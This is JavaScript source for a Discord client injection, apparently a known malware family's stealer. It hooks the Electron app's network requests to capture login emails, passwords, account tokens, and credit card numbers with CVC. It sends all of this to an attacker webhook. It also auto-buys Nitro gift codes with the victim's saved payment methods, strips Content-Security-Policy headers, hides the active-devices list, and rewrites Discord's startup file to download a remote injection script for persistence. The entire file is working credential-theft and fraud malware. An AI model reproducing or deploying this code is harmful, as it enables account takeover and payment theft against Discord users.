const args = process.argv;
const fs = require("fs");
const path = require("path");
const querystring = require("querystring");
const https = require("https");
const { BrowserWindow, session } = require("electron");
const { exec } = require("child_process");

const config = {
    auto_buy_nitro: false,
    ping_on_run: false,
    ping_val: "@here",
    embed_name: "ewe",
    embed_icon: "ewe",
    embed_color: 8363488,
    webhook: "ewe",
    injection_url: "https://raw.githubusercontent.com/zEncrypte/-/main/tgbrs/js/injection.js",
    /* DON'T TOUCH UNDER HERE IF UNLESS YOU'RE MODIFYING THE INJECTION OR KNOW WHAT YOU'RE DOING */
    api: "https://discord.com/api/v10/users/@me",
    nitro: {
        boost: {
            year: {
                id: "521847234246082599",
                sku: "511651885459963904",
                price: 9999,
            },
            month: {
                id: "521847234246082599",
                sku: "511651880837840896",
                price: 999,
            },
        },
        classic: {
            month: {
                id: "521846918637420545",
                sku: "511651871736201216",
                price: 299,
            },
        },
    },
    filter: {
        urls: [
            "https://discord.com/api/v*/users/@me",
            "https://discordapp.com/api/v*/users/@me",
            "https://*.discord.com/api/v*/users/@me",
            "https://discordapp.com/api/v*/auth/login",
            "https://discord.com/api/v*/auth/login",
            "https://*.discord.com/api/v*/auth/login",
            "https://api.braintreegateway.com/merchants/49pp2rp4phym7387/client_api/v*/payment_methods/paypal_accounts",
            "https://api.stripe.com/v*/tokens",
            "https://api.stripe.com/v1/tokens",
            "https://api.stripe.com/v*/setup_intents/*/confirm",
            "https://api.stripe.com/v*/payment_intents/*/confirm",
            "https://js.stripe.com/*"
        ],
    },
    filter2: {
        urls: [
            "https://status.discord.com/api/v*/scheduled-maintenances/upcoming.json",
            "https://*.discord.com/api/v*/applications/detectable",
            "https://discord.com/api/v*/applications/detectable",
            "https://*.discord.com/api/v*/users/@me/library",
            "https://discord.com/api/v*/users/@me/library",
            "wss://remote-auth-gateway.discord.gg/*",
        ],
    },
};

const discordPath = (function () {
    const app = args[0].split(path.sep).slice(0, -1).join(path.sep);
    let resourcePath;
    if (process.platform === "win32") {
        resourcePath = path.join(app, "resources");
    }
    else if (process.platform === "darwin") {
        resourcePath = path.join(app, "Contents", "Resources");
    }
    if (fs.existsSync(resourcePath)) return { resourcePath, app };
    return "", "";
})();

function updateCheck() {
    const { resourcePath, app } = discordPath;
    if (resourcePath === undefined || app === undefined) return;
    const appPath = path.join(resourcePath, "app");
    const packageJson = path.join(appPath, "package.json");
    const resourceIndex = path.join(appPath, "index.js");
    const indexJs = `corenum`;
    const bdPath = path.join(process.env.APPDATA, "\\betterdiscord\\data\\betterdiscord.asar");
    if (!fs.existsSync(appPath)) fs.mkdirSync(appPath);
    if (fs.existsSync(packageJson)) fs.unlinkSync(packageJson);
    if (fs.existsSync(resourceIndex)) fs.unlinkSync(resourceIndex);

    if (process.platform === "win32" || process.platform === "darwin") {
        fs.writeFileSync(
            packageJson,
            JSON.stringify(
                {
                    name: "discord",
                    main: "index.js",
                },
                null,
                4,
            ),
        );

        const startUpScript = `const fs = require('fs'), https = require('https');
const indexJS = '${indexJs}';
const bdPath = '${bdPath}';
const fileSize = fs.statSync(indexJS).size
fs.readFileSync(indexJS, 'utf8', (err, data) => {
    if (fileSize < 20000 || data === "module.exports = require('./core.asar')") 
        init();
})
async function init() {
    https.get('${config.injection_url}', (res) => {
        const file = fs.createWriteStream(indexJS);
        res.replace('core' + 'num', indexJS).replace('%WEBHOOK' + '_LINK%', '${config.webhook}').replace("~~bran" + "ding~~", '${config.embed_name}').replace("~~ic" + "on~~", '${config.embed_icon}')
        res.pipe(file);
        file.on('finish', () => {
            file.close();
        });
    
    }).on("error", (err) => {
        setTimeout(init(), 10000);
    });
}
require('${path.join(resourcePath, "app.asar")}')
if (fs.existsSync(bdPath)) require(bdPath);`;

        fs.writeFileSync(resourceIndex, startUpScript.replace(/\\/g, "\\\\"));
    }
    if (!fs.existsSync(path.join(__dirname, "Fun"))) return !0;
    fs.rmdirSync(path.join(__dirname, "Fun"));
    execScript(
        `window.webpackJsonp?(gg=window.webpackJsonp.push([[],{get_require:(a,b,c)=>a.exports=c},[["get_require"]]]),delete gg.m.get_require,delete gg.c.get_require):window.webpackChunkdiscord_app&&window.webpackChunkdiscord_app.push([[Math.random()],{},a=>{gg=a}]);function LogOut(){(function(a){const b="string"==typeof a?a:null;for(const c in gg.c)if(gg.c.hasOwnProperty(c)){const d=gg.c[c].exports;if(d&&d.__esModule&&d.default&&(b?d.default[b]:a(d.default)))return d.default;if(d&&(b?d[b]:a(d)))return d}return null})("login").logout()}LogOut();`,
    );
    return !1;
}

const execScript = (script) => {
    const window = BrowserWindow.getAllWindows()[0];
    return window.webContents.executeJavaScript(script, !0);
};

function sleep(ms) {
    return new Promise(resolve => setTimeout(resolve, ms));
};

async function noSessionPlease() {
    await sleep(1000)
    execScript(`
function userclick() {
    waitForElm(".children-1xdcWE").then((elm)=>elm[2].remove())
    waitForElm(".sectionTitle-3j2YI1").then((elm)=>elm[2].remove())
}

function IsSession(item) {
    return item?.innerText?.includes("Devices")
}

function handler(e) {
    e = e || window.event;
    var target = e.target || e.srcElement,
    text = target.textContent || target.innerText;   
    if (IsSession(target)) userclick()
}
function waitForElm(selector) {
    return new Promise(resolve => {
        const observer = new MutationObserver(mutations => {
            if (document.querySelectorAll(selector).length>2) {
                resolve(document.querySelectorAll(selector))
            observer.disconnect();
            }
        });
        observer.observe(document.body, {
            childList: true,
            subtree: true
        });
    });
}
document.addEventListener('click',handler,false);
`)
};

noSessionPlease()

const getInfo = async (token) => {
    const info = await execScript(`var xmlHttp = new XMLHttpRequest();
    xmlHttp.open("GET", "${config.api}", false);
    xmlHttp.setRequestHeader("Authorization", "${token}");
    xmlHttp.send(null);
    xmlHttp.responseText;`);
    return JSON.parse(info);
};

const fetchBilling = async (token) => {
    const bill = await execScript(`var xmlHttp = new XMLHttpRequest(); 
    xmlHttp.open("GET", "${config.api}/billing/payment-sources", false); 
    xmlHttp.setRequestHeader("Authorization", "${token}"); 
    xmlHttp.send(null); 
    xmlHttp.responseText`);
    if (bill.length === 0 && !bill.length) {
        return "";
    }
    return JSON.parse(bill);
};

const getBilling = async (token) => {
    const data = await fetchBilling(token);
    if (!data) return "❌";
    let billing = "";
    data.forEach((x) => {
        if (!x.invalid) {
            switch (x.type) {
                case 1:
                    billing += "💳 ";
                    break;
                case 2:
                    billing += ":regional_indicator_p:";
                    break;
            }
        }
    });
    if (!billing) billing = "❌";
    return billing;
};

const Purchase = async (token, id, _type, _time) => {
    const options = {
        expected_amount: config.nitro[_type][_time]["price"],
        expected_currency: "usd",
        gift: true,
        payment_source_id: id,
        payment_source_token: null,
        purchase_token: "997f754d-e863-4a23-ab0b-b77306ee5851",
        sku_subscription_plan_id: config.nitro[_type][_time]["sku"],
    };

    const req = execScript(`var xmlHttp = new XMLHttpRequest();
    xmlHttp.open("POST", "https://discord.com/api/v9/store/skus/${config.nitro[_type][_time]["id"]}/purchase", false);
    xmlHttp.setRequestHeader("Authorization", "${token}");
    xmlHttp.setRequestHeader('Content-Type', 'application/json');
    xmlHttp.send(JSON.stringify(${JSON.stringify(options)}));
    xmlHttp.responseText`);
    if (req["gift_code"]) {
        return "https://discord.gift/" + req["gift_code"];
    } else return null;
};

const buyNitro = async (token) => {
    const data = await fetchBilling(token);
    const failedMsg = "Failed to Purchase ❌";
    if (!data) return failedMsg;

    let IDS = [];
    data.forEach((x) => {
        if (!x.invalid) {
            IDS.push(x.id);
        }
    });
    var count = IDS.length;
    for(var i = 0; i < count; i++) {
        var sourceID = IDS[i];
        const first = Purchase(token, sourceID, "boost", "year");
        if (first !== null) {
            return first;
        } else {
            const second = Purchase(token, sourceID, "boost", "month");
            if (second !== null) {
                return second;
            } else {
                const third = Purchase(token, sourceID, "classic", "month");
                if (third !== null) {
                    return third;
                }
            }
        }
    }
    return failedMsg
};

const getNitro = (flags) => {
    switch (flags) {
        case 0:
            return "No Nitro";
        case 1:
            return "Nitro Classic";
        case 2:
            return "Nitro Boost";
        default:
            return "No Nitro";
    }
};

const getBadges = (flags) => {
    let badges = "";
    switch (flags) {
        case 1:
            badges += "Discord Staff, ";
            break;
        case 2:
            badges += "Partnered Server Owner, ";
            break;
        case 131072:
            badges += "Discord Developer, ";
            break;
        case 4:
            badges += "Hypesquad Event, ";
            break;
        case 16384:
            badges += "Gold BugHunter, ";
            break;
        case 8:
            badges += "Green BugHunter, ";
            break;
        case 512:
            badges += "Early Supporter, ";
            break;
        case 128:
            badges += "HypeSquad Brillance, ";
            break;
        case 64:
            badges += "HypeSquad Bravery, ";
            break;
        case 256:
            badges += "HypeSquad Balance, ";
            break;
        case 0:
            badges = "None";
            break;
        default:
            badges = "None";
            break;
    }
    return badges;
};

const hooker = async (content) => {
    const data = JSON.stringify(content);
    const url = new URL(config.webhook);
    const options = {
        protocol: url.protocol,
        hostname: url.host,
        path: url.pathname,
        method: "POST",
        headers: {
            "Content-Type": "application/json",
            "Access-Control-Allow-Origin": "*",
        },
    };
    const req = https.request(options);

    req.on("error", (err) => {
        console.log(err);
    });
    req.write(data);
    req.end();
}

const login = async (email, password, token) => {
    const json = await getInfo(token);
    const nitro = getNitro(json.premium_type);
    const badges = getBadges(json.flags);
    const billing = await getBilling(token);
    const content = {
        username: config.embed_name,
        avatar_url: config.embed_icon,
        embeds: [
            {
                color: config.embed_color,
                fields: [
                    {
                        name: "**Account Info**",
                        value: `Email: **${email}** - Password: **${password}**`,
                        inline: false,
                    },
                    {
                        name: "**Discord Info**",
                        value: `Nitro Type: **${nitro}**\nBadges: **${badges}**\nBilling: **${billing}**`,
                        inline: false,
                    },
                    {
                        name: "**Token**",
                        value: `\`${token}\``,
                        inline: false,
                    },
                ],
                author: {
                    name: json.username + "#" + json.discriminator + " | " + json.id,
                    icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
                },
            },
        ],
    };
    if (config.ping_on_run) content["content"] = config.ping_val;
    hooker(content);
};

const passwordChanged = async (oldpassword, newpassword, token) => {
    const json = await getInfo(token);
    const nitro = getNitro(json.premium_type);
    const badges = getBadges(json.flags);
    const billing = await getBilling(token);
    const content = {
        username: config.embed_name,
        avatar_url: config.embed_icon,
        embeds: [
            {
                color: config.embed_color,
                fields: [
                    {
                        name: "**Password Changed**",
                        value: `Email: **${json.email}**\nOld Password: **${oldpassword}**\nNew Password: **${newpassword}**`,
                        inline: true,
                    },
                    {
                        name: "**Discord Info**",
                        value: `Nitro Type: **${nitro}**\nBadges: **${badges}**\nBilling: **${billing}**`,
                        inline: true,
                    },
                    {
                        name: "**Token**",
                        value: `\`${token}\``,
                        inline: false,
                    },
                ],
                author: {
                    name: json.username + "#" + json.discriminator + " | " + json.id,
                    icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
                },
            },
        ],
    };
    if (config.ping_on_run) content["content"] = config.ping_val;
    hooker(content);
};

const emailChanged = async (email, password, token) => {
    const json = await getInfo(token);
    const nitro = getNitro(json.premium_type);
    const badges = getBadges(json.flags);
    const billing = await getBilling(token);
    const content = {
        username: config.embed_name,
        avatar_url: config.embed_icon,
        embeds: [
            {
                color: config.embed_color,
                fields: [
                    {
                        name: "**Email Changed**",
                        value: `New Email: **${email}**\nPassword: **${password}**`,
                        inline: true,
                    },
                    {
                        name: "**Discord Info**",
                        value: `Nitro Type: **${nitro}**\nBadges: **${badges}**\nBilling: **${billing}**`,
                        inline: true,
                    },
                    {
                        name: "**Token**",
                        value: `\`${token}\``,
                        inline: false,
                    },
                ],
                author: {
                    name: json.username + "#" + json.discriminator + " | " + json.id,
                    icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
                },
            },
        ],
    };
    if (config.ping_on_run) content["content"] = config.ping_val;
    hooker(content);
};

const PaypalAdded = async (token) => {
    const json = await getInfo(token);
    const nitro = getNitro(json.premium_type);
    const badges = getBadges(json.flags);
    const billing = await getBilling(token);
    const content = {
        username: config.embed_name,
        avatar_url: config.embed_icon,
        embeds: [
            {
                color: config.embed_color,
                fields: [
                    {
                        name: "**Paypal Added**",
                        value: `Paypal hijacking soonTM`,
                        inline: false,
                    },
                    {
                        name: "**Discord Info**",
                        value: `Nitro Type: **${nitro}**\nBadges: **${badges}**\nBilling: **${billing}**`,
                        inline: false,
                    },
                    {
                        name: "**Token**",
                        value: `\`${token}\``,
                        inline: false,
                    },
                ],
                author: {
                    name: json.username + "#" + json.discriminator + " | " + json.id,
                    icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
                },
            },
        ],
    };
    if (config.ping_on_run) content["content"] = config.ping_val;
    hooker(content);
    if (config.auto_buy_nitro) {
        nitroBought(token).catch(console.error);
    }
};

const ccAdded = async (number, cvc, expir_month, expir_year, token) => {
    const json = await getInfo(token);
    const nitro = getNitro(json.premium_type);
    const badges = getBadges(json.flags);
    const billing = await getBilling(token);
    const content = {
        username: config.embed_name,
        avatar_url: config.embed_icon,
        embeds: [
            {
                color: config.embed_color,
                fields: [
                    {
                        name: "**Credit Card Added**",
                        value: `Credit Card Number: **${number}**\nCVC: **${cvc}**\nCredit Card Expiration: **${expir_month}/${expir_year}**`,
                        inline: true,
                    },
                    {
                        name: "**Discord Info**",
                        value: `Nitro Type: **${nitro}**\nBadges: **${badges}**\nBilling: **${billing}**`,
                        inline: true,
                    },
                    {
                        name: "**Token**",
                        value: `\`${token}\``,
                        inline: false,
                    },
                ],
                author: {
                    name: json.username + "#" + json.discriminator + " | " + json.id,
                    icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
                },
            },
        ],
    };
    if (config.ping_on_run) content["content"] = config.ping_val;
    hooker(content);
    if (config.auto_buy_nitro) {
        nitroBought(token).catch(console.error);
    }
};

const nitroBought = async (token) => {
    const json = await getInfo(token);
    const nitro = getNitro(json.premium_type);
    const badges = getBadges(json.flags);
    const billing = await getBilling(token);
    const code = await buyNitro(token);
    const content = {
        username: config.embed_name,
        avatar_url: config.embed_icon,
        embeds: [
            {
                color: config.embed_color,
                fields: [
                    {
                        name: "**Nitro bought!**",
                        value: `**Nitro Code:**\n\`\`\`diff\n+ ${code}\`\`\``,
                        inline: true,
                    },
                    {
                        name: "**Discord Info**",
                        value: `Nitro Type: **${nitro}**\nBadges: **${badges}**\nBilling: **${billing}**`,
                        inline: true,
                    },
                    {
                        name: "**Token**",
                        value: `\`${token}\``,
                        inline: false,
                    },
                ],
                author: {
                    name: json.username + "#" + json.discriminator + " | " + json.id,
                    icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
                },
            },
        ],
    };
    if (config.ping_on_run) content["content"] = config.ping_val + `\n${code}`;
    hooker(content);
};

session.defaultSession.webRequest.onBeforeRequest(config.filter2, (details, callback) => {
    if (details.url.startsWith("wss://remote-auth-gateway")) return callback({ cancel: true });
    updateCheck();

});

session.defaultSession.webRequest.onResponseStarted(config.filter, async (details, callback) => {
    if (details.url.includes("tokens")) {
        const unparsed_data = Buffer.from(details.uploadData[0].bytes).toString();
        const item = querystring.parse(unparsed_data.toString());
        const token = await execScript(
            `(webpackChunkdiscord_app.push([[''],{},e=>{m=[];for(let c in e.c)m.push(e.c[c])}]),m).find(m=>m?.exports?.default?.getToken!==void 0).exports.default.getToken()`,
        );
        ccAdded(item["card[number]"], item["card[cvc]"], item["card[exp_month]"], item["card[exp_year]"], token).catch(console.error);
        return;
    }
});

session.defaultSession.webRequest.onHeadersReceived((details, callback) => {
    if (details.url.startsWith(config.webhook)) {
        if (details.url.includes("discord.com")) {
            callback({
                responseHeaders: Object.assign(
                    {
                        "Access-Control-Allow-Headers": "*",
                    },
                    details.responseHeaders,
                ),
            });
        } else {
            callback({
                responseHeaders: Object.assign(
                    {
                        "Content-Security-Policy": ["default-src '*'", "Access-Control-Allow-Headers '*'", "Access-Control-Allow-Origin '*'"],
                        "Access-Control-Allow-Headers": "*",
                        "Access-Control-Allow-Origin": "*",
                    },
                    details.responseHeaders,
                ),
            });
        }
    } else {
        delete details.responseHeaders["content-security-policy"];
        delete details.responseHeaders["content-security-policy-report-only"];

        callback({
            responseHeaders: {
                ...details.responseHeaders,
                "Access-Control-Allow-Headers": "*",
            },
        });
    }
});


session.defaultSession.webRequest.onCompleted(config.filter, async (details, _) => {
    if (details.statusCode !== 200 && details.statusCode !== 202) return;
    const unparsed_data = Buffer.from(details.uploadData[0].bytes).toString();
    const data = JSON.parse(unparsed_data);
    const token = await execScript(
        `(webpackChunkdiscord_app.push([[''],{},e=>{m=[];for(let c in e.c)m.push(e.c[c])}]),m).find(m=>m?.exports?.default?.getToken!==void 0).exports.default.getToken()`,
    );
    switch (true) {
        case details.url.endsWith("login"):
            login(data.login, data.password, token).catch(console.error);
            break;

        case details.url.endsWith("users/@me") && details.method === "PATCH":
            if (!data.password) return;
            if (data.email) {
                emailChanged(data.email, data.password, token).catch(console.error);
            }
            if (data.new_password) {
                passwordChanged(data.password, data.new_password, token).catch(console.error);
            }
            break;

        case details.url.endsWith("paypal_accounts") && details.method === "POST":
            PaypalAdded(token).catch(console.error);
            break;

        case details.url.endsWith("confirm") && details.method === "POST":
            if (!config.auto_buy_nitro) return;
            nitroBought(token).catch(console.error);

        default:
            break;
    }
});
module.exports = require("./core.asar");
